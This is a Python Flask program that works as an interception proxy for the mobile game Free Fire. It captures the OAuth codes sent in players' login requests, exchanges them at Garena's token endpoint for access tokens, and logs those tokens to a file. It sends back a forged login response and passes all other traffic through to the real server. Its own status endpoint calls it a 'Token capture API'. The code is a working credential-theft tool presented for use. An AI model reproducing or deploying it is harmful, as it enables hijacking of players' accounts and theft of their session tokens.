from flask import Flask, request, jsonify, Response
import requests
import os
import json
import base64
import re
from datetime import datetime

# ─── PROTOBUF DYNAMIC LOADER ────────────────────────────────────
from google.protobuf import descriptor_pool, message_factory

# Serialized descriptor for MajorLoginReq.proto (from MajorLoginReq_pb2.py)
MAJOR_LOGIN_REQ_DESC = b'\n\x13MajorLoginReq.proto\"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05\x12\x16\n\x0e\x63lient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0b\x64\x65vice_type\x18\x18 \x01(\t\x12\'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05\x12\"\n\x1a\x65xternal_storage_available\x18= \x01(\x05\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05\x12\"\n\x1ainternal_storage_available\x18? \x01(\x05\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t\x12\x14\n\x0cgraphics_api\x18V \x01(\t\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c\x12\x14\n\x0cloading_time\x18\\ \x01(\r\x12\x17\n\x0frelease_channel\x18] \x01(\t\x12\x12\n\nextra_info\x18^ \x01(\t\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t\"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3'

# Serialized descriptor for MajorLoginRes.proto (from MajorLoginRes_pb2.py)
MAJOR_LOGIN_RES_DESC = b'\n\x13MajorLoginRes.proto\"\x87\x05\n\rMajorLoginRes\x12\x12\n\naccount_id\x18\x01 \x01(\x03\x12\x13\n\x0block_region\x18\x02 \x01(\t\x12\x13\n\x0bnoti_region\x18\x03 \x01(\t\x12\x11\n\tip_region\x18\x04 \x01(\t\x12\x19\n\x11\x61gora_environment\x18\x05 \x01(\t\x12\x19\n\x11new_active_region\x18\x06 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03ttl\x18\t \x01(\x05\x12\x12\n\nserver_url\x18\n \x01(\t\x12\x16\n\x0e\x65mulator_score\x18\x0c \x01(\x03\x12\x32\n\tblacklist\x18\r \x01(\x0b\x32\x1f.MajorLoginRes.BlacklistInfoRes\x12\x31\n\nqueue_info\x18\x0f \x01(\x0b\x32\x1d.MajorLoginRes.LoginQueueInfo\x12\x0e\n\x06tp_url\x18\x10 \x01(\t\x12\x15\n\rapp_server_id\x18\x11 \x01(\x03\x12\x0f\n\x07\x61no_url\x18\x12 \x01(\t\x12\x0f\n\x07ip_city\x18\x13 \x01(\t\x12\x16\n\x0eip_subdivision\x18\x14 \x01(\t\x12\x0b\n\x03kts\x18\x15 \x01(\x03\x12\n\n\x02\x61k\x18\x16 \x01(\x0c\x12\x0b\n\x03\x61iv\x18\x17 \x01(\x0c\x1aQ\n\x10\x42lacklistInfoRes\x12\x12\n\nban_reason\x18\x01 \x01(\x05\x12\x17\n\x0f\x65xpire_duration\x18\x02 \x01(\x03\x12\x10\n\x08\x62\x61n_time\x18\x03 \x01(\x03\x1a\x66\n\x0eLoginQueueInfo\x12\r\n\x05\x41llow\x18\x01 \x01(\x08\x12\x16\n\x0equeue_position\x18\x02 \x01(\x03\x12\x16\n\x0eneed_wait_secs\x18\x03 \x01(\x03\x12\x15\n\rqueue_is_full\x18\x04 \x01(\x08\x62\x06proto3'

# Create a descriptor pool and add the serialized descriptors
pool = descriptor_pool.DescriptorPool()
pool.AddSerializedFile(MAJOR_LOGIN_REQ_DESC)
pool.AddSerializedFile(MAJOR_LOGIN_RES_DESC)

# Create a message factory
factory = message_factory.MessageFactory(pool)

# Get the message classes
MajorLoginReq = factory.GetPrototype(pool.FindMessageTypeByName("MajorLogin"))
MajorLoginRes = factory.GetPrototype(pool.FindMessageTypeByName("MajorLoginRes"))

# ─── FLASK APP ──────────────────────────────────────────────────
app = Flask(__name__)

# ─── CONFIGURATION ──────────────────────────────────────────────
REAL_SERVER = os.environ.get('REAL_SERVER_URL', 'https://client.ind.freefiremobile.com')
TOKEN_URL = "https://auth.garena.com/oauth/token"
CLIENT_ID = "100067"

# List of possible redirect_uri values to try
REDIRECT_URIS = [
    "https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/",
    "https://shop.garena.sg/app/100067/idlogin",
    "https://gameskharido.in/app/100067/idlogin",
    "https://shop2game.com/app/100067/login",
    "https://api.ff.garena.co.id/auth/auth/callback_n",
]

active_users = []
# ─────────────────────────────────────────────────────────────────

def decode_jwt_payload(jwt):
    try:
        parts = jwt.split('.')
        if len(parts) != 3:
            return {}
        payload = parts[1]
        payload += '=' * (4 - len(payload) % 4)
        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except Exception as e:
        print(f"JWT decode error: {e}")
        return {}

def exchange_code_for_tokens(code):
    for uri in REDIRECT_URIS:
        payload = {
            "grant_type": "authorization_code",
            "code": code,
            "client_id": CLIENT_ID,
            "redirect_uri": uri
        }
        try:
            resp = requests.post(TOKEN_URL, data=payload, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                hex_token = data.get('access_token')
                jwt_token = data.get('token')
                if hex_token and jwt_token:
                    print(f"✅ Exchange successful with redirect_uri: {uri}")
                    return hex_token, jwt_token
            else:
                print(f"❌ Exchange failed with {uri}: {resp.status_code}")
        except Exception as e:
            print(f"⚠️ Error with {uri}: {e}")
    return None, None

def build_login_response(hex_token, jwt_token, account_id, region):
    res = MajorLoginRes()
    res.account_id = int(account_id) if account_id else 0
    res.token = jwt_token
    res.ttl = 28800
    res.server_url = REAL_SERVER
    res.lock_region = region or "IND"
    res.noti_region = region or "IND"
    res.ip_region = region or "IND"
    res.agora_environment = "live"
    res.ak = b"dummy_ak"
    res.aiv = b"dummy_aiv"
    return res

@app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['GET', 'POST'])
@app.route('/user/<user_id>/<path:subpath>', methods=['GET', 'POST'])
def handle_request(user_id, subpath):
    print(f"\n🔹 {request.method} /user/{user_id}/{subpath}")

    if user_id not in active_users:
        active_users.append(user_id)
        print(f"👤 New user: {user_id}")

    if subpath == "GetLoginData":
        raw_data = request.get_data()
        print(f"📦 Received {len(raw_data)} bytes")

        # Parse as MajorLoginReq
        try:
            login_req = MajorLoginReq()
            login_req.ParseFromString(raw_data)
            print("✅ Parsed MajorLoginReq successfully.")
            oauth_code = login_req.access_token
            if oauth_code:
                print(f"🔑 Extracted OAuth code: {oauth_code[:20]}...")
            else:
                print("⚠️ No access_token field in request.")
                oauth_code = None
        except Exception as e:
            print(f"❌ Failed to parse MajorLoginReq: {e}")
            oauth_code = None

        if oauth_code:
            hex_token, jwt_token = exchange_code_for_tokens(oauth_code)
            if hex_token and jwt_token:
                print(f"🎯 HEX ACCESS TOKEN: {hex_token}")
                with open("tokens.txt", "a") as f:
                    f.write(f"{datetime.now()} | {user_id} | {hex_token}\n")

                payload = decode_jwt_payload(jwt_token)
                account_id = payload.get('account_id', '0')
                region = payload.get('country_code', 'IND')

                res = build_login_response(hex_token, jwt_token, account_id, region)
                response_data = res.SerializeToString()
                print(f"📤 Returning protobuf response of {len(response_data)} bytes")
                return Response(response_data, status=200, mimetype='application/x-protobuf')
            else:
                print("❌ Failed to exchange OAuth code.")
        else:
            print("⚠️ No OAuth code found in request.")

        # Fallback: return generic JSON success
        return jsonify({"status": "success", "message": "OK"}), 200

    # Forward other requests to the real Garena server
    try:
        real_url = f"{REAL_SERVER}/{subpath}" if subpath else REAL_SERVER
        headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'connection']}
        headers.pop('Content-Length', None)
        headers['Host'] = 'client.ind.freefiremobile.com'

        resp = requests.request(
            method=request.method,
            url=real_url,
            headers=headers,
            data=request.get_data(),
            params=request.args,
            allow_redirects=False,
            timeout=30
        )
        excluded = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        resp_headers = [(k, v) for k, v in resp.raw.headers.items() if k.lower() not in excluded]
        return Response(resp.content, status=resp.status_code, headers=resp_headers)
    except Exception as e:
        print(f"❌ Forward error: {e}")
        return jsonify({"status": "success", "message": "OK"}), 200

@app.route('/')
def admin():
    return jsonify({
        "active_users": active_users,
        "message": "Token capture API running"
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)